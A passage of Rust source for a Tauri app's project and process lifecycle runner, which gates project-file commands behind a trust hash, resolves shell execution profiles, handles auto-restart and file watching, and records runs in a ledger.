//! Project/process lifecycle runner — the thin Tauri glue over `project-model`
//!. All pure logic (the `chappa.yml` parse/containment, trust hash,
//! status mapping incl. the 500ms-alive rule, restart backoff, the
//! restart_when_changed watcher, projects.json CRUD) lives and is tested in
//! `project-model`; this module only wires it to the terminal registry,
//! the frontend commands, and the lifecycle semantics that need a live child.
//!
//! ## Execution profile (DECIDED 2026-08-05)
//! A project-file `command` line runs via `cmd /C <command>` on Windows and
//! `sh -c <command>` elsewhere. This is deliberately a DIFFERENT path from
//! interactive terminals, which use `default_shell()` in commands.rs
//! (pwsh/powershell PATH probe / `$SHELL`). Rationale: the documented
//! execution profile runs yml command lines through cmd.exe, matching what
//! other project runners do. `py app/summarize.py` is a plain command line
//! for `cmd /C`, not an interactive pwsh session.
//!
//! ## Frontend-driven spawns (schema-forced)
//! `open_project` loads the yml, builds per-process runtime state (status
//! `stopped`, nothing spawned) and reports the trust gate; the actual spawns
//! are initiated by the frontend via `start_project_process`, which supplies
//! the per-terminal frames Channel the registry needs (a webview-only
//! artifact — the Rust side cannot fabricate one). After a Run on the trust
//! gate the frontend starts every `auto_start` process. Auto_restart respawns
//! REUSE the same registry TermId and frames Channel, so the frontend panel
//! survives restarts without re-subscribing. The S/A/P project chords are
//! frontend loops over `start_project_process` / `stop_project_process`
//! (each iteration supplies its own Channel), not Rust bulk commands — the
//! `Vec<Channel>` shape was too fragile.

use std::collections::{BTreeMap, HashMap};
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::mpsc::Receiver;
use std::sync::{Arc, Condvar, Mutex};
use std::time::{Duration, Instant};

use indexmap::IndexMap;
use project_model::backoff::RestartBackoff;
#[cfg(test)]
use project_model::hash;
use project_model::projects::{ProcessOverride, ProjectStore};
use project_model::records::{RecordKind, Run, RunHead, TailKind};
use project_model::settings::{split_command_line, Settings, EXEC_PROFILE_CMD, EXEC_PROFILE_SH};
use project_model::status::{Lifecycle, ProcessEvent, RUNNING_AFTER_MS};
use project_model::watcher::{ChangeMatcher, RecursiveMode, RestartWatcher};
use project_model::writeback;
use project_model::yml::{CommandLine, ProcessDef, ProjectYml};
use serde::{Deserialize, Serialize};
use stack_core::safety::secrets::config::ProjectScanConfig;
use tauri::ipc::{Channel, InvokeResponseBody};
use tauri::{AppHandle, Emitter, State};
use term_core::actor::epoch_ms;
use term_core::pty::PtySpec;
use term_core::status::ProcessStatus;

use crate::coordination::Coordination;
use crate::records::RunLedger;
use crate::registry::{
    actor_config, emit_created, AppCreatedBroadcast, ChannelSink, CreatedEvent, ExitHandler,
    RecordBinding, Registry, TermId,
};
use crate::roots::{Root, RootKind};
use crate::scan_config::ScanConfigSource;
use crate::settings::SettingsState;
use crate::sources::Sources;

/// One open project: the parsed yml (fresh at open), the trust hash, and the
/// per-process runtime state. Display name/icon are not duplicated here — the
/// DTOs read them from the yml/store at open time.
struct ProjectRuntime {
    root: PathBuf,
    yml_hash: String,
    processes: IndexMap<String, ProcessRuntime>,
    /// The reason the LAST reload of chappa.yml failed, or `None` while
    /// the file parses. While set, every mutation command refuses (the
    /// write-back also re-checks by loading fresh) and the UI shows it.
    load_error: Option<String>,
    /// The project-file watcher (non-recursive, debounced). Its consumer
    /// thread reloads the project; dropping this ends the thread.
    _yml_watcher: Option<RestartWatcher>,
    /// The project's git worktrees (cwd roots), listed on demand and kept
    /// for [`WORKTREE_CACHE_TTL`]; dropped on every project-file reload.
    worktrees: Option<WorktreeCache>,
    /// The project's own gitleaks config as the gates get it
    /// ([`crate::scan_config`]): pinned at the hash last trusted, which it
    /// keeps while a change waits for trust (the scans then see the hash
    /// differ and fall back), or named with why it is not used.
    scan_config: ProjectScanConfig,
    /// A watcher on that config file (it may live outside the folder the
    /// project-file watcher sees), so an edit re-prompts like an edit of
    /// `chappa.yml` does. Rebuilt when the file named changes.
    scan_config_watcher: Option<(PathBuf, RestartWatcher)>,
}

/// One `git worktree list` result and when it was taken.
struct WorktreeCache {
    paths: Vec<PathBuf>,
    listed_at: Instant,
}

/// How long a worktree listing stands before the next cwd check lists
/// again. A worktree added from a shell shows up within this.
pub const WORKTREE_CACHE_TTL: Duration = Duration::from_secs(60);

/// One process of an open project. Status lives in `lifecycle` (project-model,
/// including the 500ms-alive tick); the registry entry is reached through
/// `term_id`, which is STABLE across auto-restarts so the frontend panel and
/// frames channel stay bound to one id.
struct ProcessRuntime {
    def: ProcessDef,
    lifecycle: Lifecycle,
    term_id: Option<TermId>,
    exit_code: Option<i32>,
    backoff: RestartBackoff,
    /// The frontend's frames channel, retained so auto_restart can respawn
    /// into the SAME terminal id/channel without the webview re-subscribing.
    channel: Option<Channel<InvokeResponseBody>>,
    /// The restart_when_changed watcher, kept alive for the process's
    /// lifetime. Dropping it (project close/remove) stops notify, which
    /// disconnects the debounce channel and ends the consumer thread.
    watcher: Option<RestartWatcher>,
    /// The debounced restart-signal stream (`None` when the yml lists no
    /// patterns or every glob was invalid).
    watcher_rx: Option<Receiver<()>>,
    /// True once the watcher-signal consumer thread is running. Started at
    /// the FIRST spawn; respawns never spawn a second consumer.
    watcher_started: bool,
    spawned_at: Instant,
    /// Incremented on every spawn/stop/restart; a scheduled auto-restart or a
    /// debounced watcher restart carries the generation it was scheduled
    /// under and bails if a user action superseded it while it waited.
    generation: u32,
    /// For a command that starts the stack runner: the definition hash the
    /// person last trusted, which every launch passes on
    /// ([`crate::stack_trust`]). `None` = nothing trusted yet. It stays
    /// put while a changed definition waits for trust, so a restart in the
    /// meantime still runs nothing new.
    trusted_definition: Option<String>,
    /// For a stack runner: the project's own gitleaks config with the hash
    /// it was trusted at, which every launch passes on (see
    /// [`ProjectRuntime::scan_config`]).
    scan_config: ProjectScanConfig,
}

#[derive(Clone, Default)]
pub struct Projects {
    inner: Arc<Mutex<Inner>>,
}

struct Inner {
    store: Option<ProjectStore>,
    runtimes: HashMap<u32, ProjectRuntime>,
    /// Signalled whenever ANY process's `term_id`, lifecycle status or
    /// `generation` changes, so `control_start` can park on it instead of
    /// re-locking every 50ms. Paired with the mutex that wraps this `Inner`,
    /// so a waiter checking its predicate under the lock cannot miss a
    /// signal. Held behind an `Arc` because most write paths only ever see a
    /// `&mut Inner` (the guard), never the `Projects` handle — those call
    /// [`Inner::notify_changed`] directly.
    ///
    /// EVERY mutation of those three fields must notify. A missed signal does
    /// not corrupt anything (the wait is still deadline-bounded), but it
    /// degrades a start into a spurious `pending: true`.
    changed: Arc<Condvar>,
    app: Option<AppHandle>,
    /// The app settings, so spawns can resolve `default_exec_profile`
    /// and seed the per-actor controls. A clone of the managed state (its own
    /// mutex), locked only for a `snapshot()` and never in the reverse order
    /// — `set_settings` takes settings → registry, never projects.
    settings: SettingsState,
    shutting_down: bool,
    /// The run ledger (coordination.db) a command's runs are written to.
    /// Held here because the record head is written under THIS lock (the
    /// records service cannot be called back into from here); the ledger
    /// has its own connection mutex. Inert by default (tests).
    ledger: RunLedger,
    /// The source registry: a `source:` command gets its address and token
    /// from it at spawn and reports back when the process is gone. A clone
    /// of the managed state; locked only after this lock, never before.
    sources: Sources,
    /// The standing agent settings warnings (their own mutex; never locked
    /// while this one is held).
    agent_settings: crate::agent_settings::AgentSettingsWarnings,
}

impl Default for Inner {
    fn default() -> Self {
        Self {
            store: None,
            runtimes: HashMap::new(),
            changed: Arc::new(Condvar::new()),
            app: None,
            settings: SettingsState::default(),
            shutting_down: false,
            ledger: RunLedger::default(),
            sources: Sources::default(),
            agent_settings: Default::default(),
        }
    }
}

impl Inner {
    /// Wake anything parked on [`Inner::changed`] (today: `control_start`).
    /// Callable from a write path that only holds the guard; safe to call
    /// while still holding the lock — the waiter re-checks its predicate
    /// under the same mutex, so an extra wake is a no-op and a missing one is
    /// the only real bug.
    fn notify_changed(&self) {
        self.changed.notify_all();
    }

    /// The settings a launch uses: the snapshot, with a Settings ▸ Security
    /// gitleaks config that lies inside an open project folder dropped (it
    /// is refused: see [`crate::scan_config::settings_config`]).
    fn launch_settings(&self) -> Settings {
        let mut settings = self.settings.snapshot();
        let roots: Vec<&Path> = self.runtimes.values().map(|r| r.root.as_path()).collect();
        settings.secret_scan_config = crate::scan_config::settings_config(&settings, roots)
            .map(|p| p.display().to_string())
            .unwrap_or_default();
        settings
    }
}

/// Why a control-surface project call failed. The HTTP layer maps VARIANTS to
/// status codes (`control_http::project_response`); it used to sniff
/// substrings of the message ("not open", "no process"), so a reworded error
/// silently changed the status code. `Display` reproduces those exact
/// messages, and `From<ControlError> for String` keeps the Tauri commands —
/// which answer `Result<_, String>` — working with plain `?`.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum ControlError {
    /// No project with that id, or no process by that name inside it.
    NotFound(String),
    /// The project exists but is not OPEN in the app, so it has no runtime to
    /// act on (chappa-ai can only drive processes of an open project).
    NotOpen(String),
    /// The project's loaded content is not the trusted content, so none of
    /// its commands may start until the trust prompt is answered with Run.
    Untrusted(String),
    /// Everything else: store not initialized, poisoned state, spawn failure.
    Internal(String),
}

impl ControlError {
    fn no_project(id: u32) -> Self {
        ControlError::NotFound(format!("no such project: {id}"))
    }

    fn no_process(name: &str, id: u32) -> Self {
        ControlError::NotFound(format!("no process `{name}` in project {id}"))
    }

    fn not_open(id: u32) -> Self {
        ControlError::NotOpen(format!("project {id} is not open"))
    }

    fn untrusted(name: &str) -> Self {
        ControlError::Untrusted(format!(
            "{UNTRUSTED_START}: `{name}` is defined by this project's chappa.yml, which is not \
             the trusted content; answer the project's trust prompt with Run first"
        ))
    }
}

/// The lead of a start refused because the project's content is not
/// trusted; the webview matches it to offer the trust prompt.
pub const UNTRUSTED_START: &str = "not trusted";

/// Whether project `id`'s LOADED content is the trusted content.
///
/// A start runs a definition from the project folder, which anyone who can
/// write there controls. The trust prompt is the one place the person sees
/// what auto-starts; answering Skip (or closing it) leaves the content
/// untrusted, and so does an edit the reload gate has not been answered
/// for. Without this check a row click, a record start or the control
/// route would still run those definitions: none of them shows the command
/// first. So: no start of any command while the content is not trusted.
fn content_trusted(inner: &Inner, id: u32) -> bool {
    loaded_content_trusted(
        inner.store.as_ref(),
        id,
        inner.runtimes.get(&id).map(|r| r.yml_hash.as_str()),
    )
}

/// [`content_trusted`] on its parts: `loaded` is the open project's
/// loaded content hash (`None`: not open, nothing to start).
fn loaded_content_trusted(store: Option<&ProjectStore>, id: u32, loaded: Option<&str>) -> bool {
    match (store, loaded) {
        (Some(store), Some(hash)) => store.is_trusted(id, hash),
        _ => false,
    }
}

impl std::fmt::Display for ControlError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            ControlError::NotFound(m)
            | ControlError::NotOpen(m)
            | ControlError::Untrusted(m)
            | ControlError::Internal(m) => f.write_str(m),
        }
    }
}

impl From<ControlError> for String {
    fn from(err: ControlError) -> String {
        err.to_string()
    }
}

/// Errors from the layers below (spec building, the registry spawn) are
/// internal by definition — the caller asked for something that exists.
impl From<String> for ControlError {
    fn from(message: String) -> Self {
        ControlError::Internal(message)
    }
}

impl Projects {
    /// Called once from setup: point the store at the app-config dir, keep the
    /// handle for events, and start the 500ms-alive ticker.
    pub fn init(
        &self,
        app: &AppHandle,
        config_dir: PathBuf,
        settings: SettingsState,
        coordination: Coordination,
        sources: Sources,
    ) {
        // First-launch migration: every stored project materializes
        // `chappa.yml` from its store definitions, so the new project file
        // exists and nothing is lost — no user action and no behavior change
        // (same commands, same statuses). A project that had sync ON keeps its
        // chappa.yml untouched and un-watched; a project with no definitions
        // writes no file. A lasting chappa.yml that fails to parse logs here;
        // it surfaces in the UI on open, exactly as the load error.
        let mut store = ProjectStore::new(config_dir.join("projects.json"));
        match project_model::native::migrate(&mut store) {
            Ok(errors) => {
                for (id, e) in errors {
                    log::warn!("migration: project {id} chappa.yml failed to load: {e}");
                }
            }
            Err(e) => log::warn!("migration failed: {e}"),
        }
        let inner = self.inner.clone();
        {
            let mut guard = inner.lock().unwrap();
            guard.store = Some(store);
            guard.app = Some(app.clone());
            guard.settings = settings;
            guard.ledger = RunLedger::new(coordination);
            guard.sources = sources;
            guard.agent_settings = crate::agent_settings::AgentSettingsWarnings::at(
                config_dir.join(crate::agent_settings::STORE_FILE),
            );
            // The warnings kept from the last run: drop the ones resolved
            // while the app was closed, off the setup path.
            let warnings = guard.agent_settings.clone();
            let app = app.clone();
            std::thread::spawn(move || {
                let changed = warnings.revalidate();
                crate::agent_settings::emit(
                    Some(&app),
                    &warnings,
                    None,
                    Path::new(""),
                    &crate::agent_settings::Update {
                        new: Vec::new(),
                        changed,
                    },
                );
            });
            sweep_scan_scratch(
                guard
                    .store
                    .as_ref()
                    .map(|s| s.list().iter().map(|p| p.path.clone()).collect())
                    .unwrap_or_default(),
            );
        }
        spawn_ticker(inner);
    }

    /// A projects state over an explicit store and no app handle (tests,
    /// headless services): store operations work, anything that needs the
    /// window (starts, status events) answers a clear error.
    pub fn with_store(store: ProjectStore) -> Self {
        let this = Self::default();
        this.inner.lock().unwrap().store = Some(store);
        this
    }

    /// The source registry these projects launch their sources into (and
    /// whose data-safety blocks every agent spawn checks).
    pub fn sources(&self) -> Sources {
        self.inner
            .lock()
            .map(|inner| inner.sources.clone())
            .unwrap_or_default()
    }

    /// The standing agent settings warnings.
    pub fn agent_settings(&self) -> crate::agent_settings::AgentSettingsWarnings {
        self.inner
            .lock()
            .map(|inner| inner.agent_settings.clone())
            .unwrap_or_default()
    }

    /// Keep the agent settings warnings somewhere else (tests); the app's
    /// come in through [`Projects::init`].
    pub fn set_agent_settings(&self, warnings: crate::agent_settings::AgentSettingsWarnings) {
        if let Ok(mut inner) = self.inner.lock() {
            inner.agent_settings = warnings;
        }
    }

    /// Check for agent settings files git would commit in `project_root`,
    /// `extra` (an agent's folder) and every worktree of the project's
    /// stacks, and fold the result into the standing warnings. Runs git;
    /// call it off the lock and off the UI thread.
    pub fn check_agent_settings_now(
        &self,
        project_root: &Path,
        extra: &[PathBuf],
    ) -> crate::agent_settings::Update {
        let folders = crate::agent_settings::folders_for(project_root, extra);
        self.agent_settings().observe(project_root, &folders)
    }

    /// [`Projects::check_agent_settings_now`] on a thread of its own, then
    /// the warning (log + event) for what changed. Never blocks the caller
    /// and never blocks anything else: it only warns.
    pub fn check_agent_settings(
        &self,
        term_id: Option<u32>,
        project_root: PathBuf,
        extra: Vec<PathBuf>,
    ) {
        let this = self.clone();
        std::thread::spawn(move || {
            let update = this.check_agent_settings_now(&project_root, &extra);
            let app = this.inner.lock().ok().and_then(|i| i.app.clone());
            crate::agent_settings::emit(
                app.as_ref(),
                &this.agent_settings(),
                term_id,
                &project_root,
                &update,
            );
        });
    }

    /// Point a store-only projects state (tests, headless services) at a
    /// source registry; the app's comes in through [`Projects::init`].
    pub fn set_sources(&self, sources: Sources) {
        if let Ok(mut inner) = self.inner.lock() {
            inner.sources = sources;
        }
    }

    /// Run `f` against the store under the projects lock. The records
    /// service reaches the per-project records through this; `f` must not
    /// call back into `Projects`.
    pub fn store_access<T>(&self, f: impl FnOnce(&mut ProjectStore) -> T) -> Result<T, String> {
        let mut inner = self.store()?;
        let store = inner
            .store
            .as_mut()
            .ok_or_else(|| "projects store not initialized".to_owned())?;
        Ok(f(store))
    }

    /// App-exit: stop every project process, cancel all pending restarts, and
    /// make the registry's `shutdown_all` authoritative (no respawn race).
    pub fn shutdown(&self, registry: &Registry) {
        let mut inner = self.inner.lock().unwrap();
        inner.shutting_down = true;
        for runtime in inner.runtimes.values_mut() {
            for proc in runtime.processes.values_mut() {
                proc.generation += 1; // cancels any scheduled respawn
                if let Some(id) = proc.term_id.take() {
                    registry.close(id);
                }
                // Dropping the watcher stops notify → the consumer thread's
                // channel disconnects and it exits on its next recv.
                proc.watcher = None;
                proc.watcher_rx = None;
            }
        }
        inner.runtimes.clear();
        inner.notify_changed();
    }

    /// The shared state Arc. Helper threads (exit handlers, watcher
    /// consumers, the ticker) clone this so they can lock/re-lock without a
    /// Tauri `State`.
    fn arc(&self) -> Arc<Mutex<Inner>> {
        self.inner.clone()
    }

    /// Start every live stack runner of every open project again. The
    /// gitleaks config from Settings ▸ Security reaches a runner on its
    /// command line, so a changed value takes effect with a new launch
    /// (nothing else about the runner changes).
    pub fn relaunch_stack_runners(&self, registry: &Registry, app: &AppHandle) {
        let Ok(mut inner) = self.inner.lock() else {
            return;
        };
        let arc = self.arc();
        for (id, names) in live_stack_runners(&inner.runtimes) {
            relaunch_locked(&mut inner, registry, app, arc.clone(), id, &names);
        }
    }

    /// The project's own gitleaks config as the pre-agent scan gets it: the
    /// open project's pin, else (not open) what is on disk, pinned only when
    /// the stored trust covers it. [`ProjectScanConfig::None`] for no
    /// project or no config.
    pub fn scan_config_for(&self, id: Option<u32>) -> ProjectScanConfig {
        let Some(id) = id else {
            return ProjectScanConfig::None;
        };
        let root = {
            let Ok(inner) = self.inner.lock() else {
                return ProjectScanConfig::None;
            };
            if let Some(rt) = inner.runtimes.get(&id) {
                return rt.scan_config.clone();
            }
            match inner.store.as_ref().and_then(|s| s.get(id)) {
                Some(p) => p.path.clone(),
                None => return ProjectScanConfig::None,
            }
        };
        let Ok(yml) = ProjectYml::load_result(&root) else {
            return ProjectScanConfig::None;
        };
        let Some(scan) = ScanConfigSource::of(&root, &yml) else {
            return ProjectScanConfig::None;
        };
        let trusted = crate::stack_trust::trust_hash_on_disk(&root).is_some_and(|h| {
            self.inner
                .lock()
                .ok()
                .and_then(|i| i.store.as_ref().map(|s| s.is_trusted(id, &h)))
                .unwrap_or(false)
        });
        scan.pinned(trusted)
    }

    /// The folders of the open projects (a Settings gitleaks config inside
    /// one is refused).
    pub fn open_roots(&self) -> Vec<PathBuf> {
        self.inner
            .lock()
            .map(|i| i.runtimes.values().map(|r| r.root.clone()).collect())
            .unwrap_or_default()
    }

    /// Why a call that changes something through the stack runner `command`
    /// of project `id` (any of its runners when `None`) is refused: the
    /// definition on disk is not the one the person trusted, so the stack
    /// is read-only (acknowledgements included) until it is trusted again.
    /// `None` lets the call through: no stack runner, or a trusted one.
    pub fn stack_refusal(&self, id: u32, command: Option<&str>) -> Option<String> {
        // Copied out under the lock; the definitions are read off it.
        let (root, open) = {
            let inner = self.inner.lock().ok()?;
            let root = inner.store.as_ref()?.get(id)?.path.clone();
            let open = inner
                .runtimes
                .get(&id)
                .map(|rt| stack_runners_of(rt, command));
            (root, open)
        };
        stack_refusal_of(&root, open.as_deref(), command, |hash| {
            self.inner
                .lock()
                .ok()
                .and_then(|i| i.store.as_ref().map(|s| s.is_trusted(id, hash)))
                .unwrap_or(false)
        })
    }

    fn store<'a>(&'a self) -> Result<std::sync::MutexGuard<'a, Inner>, ControlError> {
        let inner = self
            .inner
            .lock()
            .map_err(|_| ControlError::Internal("projects state poisoned".to_owned()))?;
        if inner.store.is_none() {
            return Err(ControlError::Internal(
                "projects store not initialized".to_owned(),
            ));
        }
        Ok(inner)
    }

    /// A stored project's (name, root) for an agent spawn's cwd and
    /// `agent_instructions`. `None` for an unknown id or an uninitialized
    /// store.
    pub fn project_root(&self, id: u32) -> Option<(String, PathBuf)> {
        let inner = self.store().ok()?;
        let store = inner.store.as_ref()?;
        store.get(id).map(|p| (p.name.clone(), p.path.clone()))
    }

    /// The project's stored "scan for secrets before launching an agent"
    /// override, `None` when it follows the app setting.
    pub fn secret_scan_pref(&self, id: u32) -> Option<bool> {
        let inner = self.store().ok()?;
        inner.store.as_ref()?.get(id).and_then(|p| p.secret_scan)
    }

    /// The cwd roots a working directory may fall under (see [`crate::roots`]):
    /// for `Some(id)` that project's directory plus its git worktrees, for
    /// `None` every OPEN project's; plus, for `source: Some(id)`, the extra
    /// roots that source asked for when it was trusted. A source's roots
    /// were approved for that source alone: never for another source's
    /// actions, nor for a spawn through the control API (`source: None`).
    /// Worktree listings are cached per open project and refreshed after
    /// [`WORKTREE_CACHE_TTL`] or a project-file reload; git runs off the
    /// lock.
    pub fn cwd_roots(&self, project_id: Option<u32>, source: Option<&str>) -> Vec<Root> {
        // Pass 1, under the lock: the directories and which caches are stale.
        let (mut roots, stale, sources): (Vec<Root>, Vec<(u32, PathBuf)>, Sources) = {
            let Ok(inner) = self.inner.lock() else {
                return Vec::new();
            };
            let mut roots = Vec::new();
            let mut stale = Vec::new();
            let mut consider =
                |id: u32, root: &Path, runtime: Option<&ProjectRuntime>, name: String| {
                    roots.push(Root::new(root, RootKind::Project { id, name }));
                    match runtime.and_then(|r| r.worktrees.as_ref()) {
                        Some(cache) if cache.listed_at.elapsed() < WORKTREE_CACHE_TTL => {
                            roots.extend(
                                cache
                                    .paths
                                    .iter()
                                    .map(|p| Root::new(p, RootKind::Worktree { project_id: id })),
                            );
                        }
                        _ if runtime.is_some() => stale.push((id, root.to_path_buf())),
                        _ => {}
                    }
                };
            match project_id {
                Some(id) => {
                    if let Some(p) = inner.store.as_ref().and_then(|s| s.get(id)) {
                        consider(id, &p.path, inner.runtimes.get(&id), p.name.clone());
                    }
                }
                None => {
                    for (id, runtime) in &inner.runtimes {
                        let name = inner
                            .store
                            .as_ref()
                            .and_then(|s| s.get(*id))
                            .map(|p| p.name.clone())
                            .unwrap_or_default();
                        consider(*id, &runtime.root, Some(runtime), name);
                    }
                }
            }
            (roots, stale, inner.sources.clone())
        };
        // Pass 2, off the lock: list the stale ones and store the result.
        for (id, root) in stale {
            let Some(paths) = crate::roots::git_worktrees(&root) else {
                continue;
            };
            roots.extend(
                paths
                    .iter()
                    .map(|p| Root::new(p, RootKind::Worktree { project_id: id })),
            );
            if let Ok(mut inner) = self.inner.lock() {
                if let Some(runtime) = inner.runtimes.get_mut(&id) {
                    runtime.worktrees = Some(WorktreeCache {
                        paths,
                        listed_at: Instant::now(),
                    });
                }
            }
        }
        // Lock order projects → sources: the projects lock is released here.
        if let Some(source) = source {
            for (source_id, path) in sources.trusted_roots() {
                if source_id == source {
                    roots.push(Root::new(path, RootKind::Source { source_id }));
                }
            }
        }
        roots
    }

    /// Forget a project's worktree listing so the next cwd check lists again
    /// (a worktree was just added or removed by something the app ran).
    pub fn invalidate_worktrees(&self, id: u32) {
        if let Ok(mut inner) = self.inner.lock() {
            if let Some(runtime) = inner.runtimes.get_mut(&id) {
                runtime.worktrees = None;
            }
        }
    }
}

/// Wall-clock ms for the project-model lifecycle (fake-able there, real here).
/// One clock reading for the whole workspace — see `term_core::actor::epoch_ms`
/// (its never-zero clamp is the `last_output_ms` sentinel and is harmless
/// here: a lifecycle timestamp of 0 vs 1 ms after the epoch is the same lie).
fn now_ms() -> u64 {
    epoch_ms()
}

/// Project-file commands run through the execution profile (see the module doc
/// for why this differs from the interactive `default_shell()`).
///
/// Makes the profile a SETTING (`default_exec_profile`) instead of a
/// hardcode. Two builtin names keep the behavior exactly — `"cmd"`
/// (`cmd /C <command>`) and `"sh"` (`sh -c <command>`) — and one of them is
/// the platform default, so the out-of-the-box behavior is unchanged. Any
/// other value names a SHELL PROFILE; that profile's PROGRAM (its own args
/// are dropped — a profile line like `powershell.exe -NoLogo` is an
/// interactive invocation, not a command runner) is invoked with the flag
/// this heuristic picks:
///
/// - program file stem "powershell" or "pwsh" → `-NoLogo -Command <command>`
/// - program file stem "cmd"                  → `/C <command>`
/// - anything else (bash/zsh/sh/…)            → `-c <command>`
///
/// EXACT file-stem matching: substring matching handed
/// `cmder` cmd's `/C`. Still a heuristic for hand-entered shells; a real fix
/// would be a per-profile exec-flag field in the settings schema (candidate
/// refactor, NOT done here).
///
/// The profile lookup deliberately IGNORES the enable toggle — the pane
/// scopes that toggle to the new-terminal menu ("disabling a profile hides
/// it from the new-terminal menu, it does not retire it as the project-file
/// runner"), and a disabled runner silently downgrading to `cmd /C` would
/// be a surprise.
pub(crate) fn execution_command(command: &str, settings: &Settings) -> (String, Vec<String>) {
    let profile_name = settings.default_exec_profile.as_str();
    let is_builtin = profile_name == EXEC_PROFILE_CMD || profile_name == EXEC_PROFILE_SH;
    if !is_builtin {
        if let Some(profile) = settings.profile(profile_name) {
            let (program, _profile_args) = split_command_line(&profile.command);
            if !program.is_empty() {
                let stem = Path::new(&program)
                    .file_stem()
                    .map(|s| s.to_string_lossy().to_ascii_lowercase())
                    .unwrap_or_default();
                let mut args: Vec<String> = match stem.as_str() {
                    "powershell" | "pwsh" => {
                        vec!["-NoLogo".to_owned(), "-Command".to_owned()]
                    }
                    "cmd" => vec!["/C".to_owned()],
                    _ => vec!["-c".to_owned()],
                };
                args.push(command.to_owned());
                return (program, args);
            }
        }
    }
    // Builtins are honored EXPLICITLY (the pane offers both on every
    // platform): the platform default only decides what an untouched config
    // uses. An unknown profile name (or one with an empty command line)
    // falls back to the platform builtin.
    match profile_name {
        EXEC_PROFILE_SH => ("sh".to_owned(), vec!["-c".to_owned(), command.to_owned()]),
        EXEC_PROFILE_CMD => ("cmd".to_owned(), vec!["/C".to_owned(), command.to_owned()]),
        _ if cfg!(windows) => ("cmd".to_owned(), vec!["/C".to_owned(), command.to_owned()]),
        _ => ("sh".to_owned(), vec!["-c".to_owned(), command.to_owned()]),
    }
}

/// A resolved command: the program, its arguments, and the extra environment
/// it runs with.
pub(crate) type ProcessCommand = (String, Vec<String>, Vec<(String, String)>);

/// Program, args and extra env for one project or workspace command. A list
/// command runs its first word directly with the rest as arguments: no
/// execution profile, no quote indirection, nothing re-parsed. A shell line
/// goes through the execution profile, with the cmd.exe quote indirection
/// applied when that profile is cmd.
pub(crate) fn process_command(
    command: &CommandLine,
    settings: &Settings,
) -> Result<ProcessCommand, String> {
    if let Some(words) = command.argv() {
        let (program, args) = words
            .split_first()
            .filter(|(program, _)| !program.trim().is_empty())
            .ok_or_else(|| "command must not be blank".to_owned())?;
        return Ok((program.clone(), args.to_vec(), Vec::new()));
    }
    let (program, args) = execution_command(&command.display(), settings);
    let (args, env) = cmd_quote_indirection(&program, args);
    Ok((program, args, env))
}

/// Resolve a process's spawn spec: execution profile + contained working_dir +
/// yml env merged over inherited (the actor applies `spec.env` last). A
/// working_dir that escapes the project root fails THIS process, not the
/// project.
fn build_spec(def: &ProcessDef, root: &Path, settings: &Settings) -> Result<PtySpec, String> {
    let cwd = match def.resolve_working_dir(root)? {
        Some(dir) => dir,
        None => root.to_path_buf(),
    };
    let (command, args, indirection_env) = process_command(&def.command, settings)?;
    Ok(PtySpec {
        command,
        args,
        cwd: Some(cwd),
        env: def
            .env
            .iter()
            .map(|(k, v)| (k.clone(), v.clone()))
            .chain(indirection_env)
            .collect(),
        cols: 80,
        rows: 24,
    })
}

/// Env var carrying a project command to `cmd.exe` when it contains double
/// quotes (Windows only). CreateProcessW argument quoting turns an embedded
/// `"` into `\"`, which `cmd /C` does NOT unescape (it is not a
/// CommandLineToArgvW consumer) — the child then sees the backslashes
/// (`py -c "import x"` → python: unterminated string literal, 2026-08-30).
/// Passing the text through an env var keeps it off the CreateProcess line
/// entirely: `cmd /C call %CHAPPA_CMD%` expands it verbatim at parse time,
/// and `call` gives the expanded text its own `%VAR%` expansion pass so a
/// command's own variables still resolve. Commands without quotes keep the
/// plain `/C <command>` form (identical behaviour to before).
pub const CMD_INDIRECTION_VAR: &str = "CHAPPA_CMD";

pub(crate) fn cmd_quote_indirection(
    program: &str,
    args: Vec<String>,
) -> (Vec<String>, Vec<(String, String)>) {
    let is_cmd = Path::new(program)
        .file_stem()
        .map(|s| s.to_string_lossy().eq_ignore_ascii_case("cmd"))
        .unwrap_or(false);
    let needs =
        is_cmd && args.len() == 2 && args[0].eq_ignore_ascii_case("/c") && args[1].contains('"');
    if !needs {
        return (args, Vec::new());
    }
    let command = args.into_iter().nth(1).unwrap_or_default();
    (
        vec![
            "/C".to_owned(),
            "call".to_owned(),
            format!("%{CMD_INDIRECTION_VAR}%"),
        ],
        vec![(CMD_INDIRECTION_VAR.to_owned(), command)],
    )
}

/// Emit one `project://process_status` event (the process-row lifecycle
/// source for the frontend; the registry's `term://status` stays the
/// per-terminal source).
fn emit_status(
    app: &AppHandle,
    project_id: u32,
    name: &str,
    status: ProcessStatus,
    exit_code: Option<i32>,
    term_id: Option<TermId>,
) {
    let _ = app.emit(
        "project://process_status",
        &serde_json::json!({
            "project_id": project_id,
            "name": name,
            "status": status.as_str(),
            "exit_code": exit_code,
            "term_id": term_id,
        }),
    );
}

/// Begin a run for command `name` of project `id`: the command's record id
/// (assigned on first use), a fresh run uuid, the store head and the ledger
/// row — all BEFORE the terminal exists, so the binding handed to the
/// registry names a run the store already knows. Callers hold the projects
/// lock. `None` (logged) when the store cannot be written: the command still
/// runs, this run just leaves no record.
fn begin_command_run(inner: &mut Inner, id: u32, name: &str) -> Option<RecordBinding> {
    let store = inner.store.as_mut()?;
    let record_id = match store.ensure_command_record_id(id, name) {
        Ok(record_id) => record_id,
        Err(e) => {
            log::warn!("`{name}`: no record for this run: {e}");
            return None;
        }
    };
    let run_uuid = match crate::control_http::random_hex(16) {
        Ok(uuid) => uuid,
        Err(e) => {
            log::warn!("`{name}`: no record for this run: cannot generate a run uuid: {e}");
            return None;
        }
    };
    let run = Run::begin(run_uuid.clone(), now_ms(), TailKind::Text);
    if let Err(e) = store.begin_run(&record_id, run.clone()) {
        log::warn!("`{name}`: run {run_uuid} not recorded: {e}");
        return None;
    }
    if let Err(e) = inner
        .ledger
        .insert(&record_id, Some(id), RecordKind::Command, &run)
    {
        log::warn!("`{name}`: ledger row for run {run_uuid} not written: {e}");
    }
    Some(RecordBinding {
        record_id,
        run_uuid,
    })
}

/// Wire one process's terminal spawn up with its auto_restart / watcher hooks.
/// `root` is an OWNED clone of the project root so the caller never holds a
/// `&ProjectRuntime` alongside the `&mut ProcessRuntime` it also passes
/// (borrow discipline). `term_id` is the registry key to (re)use — the first
/// spawn allocates it, respawns reuse it. `record` is this run's binding
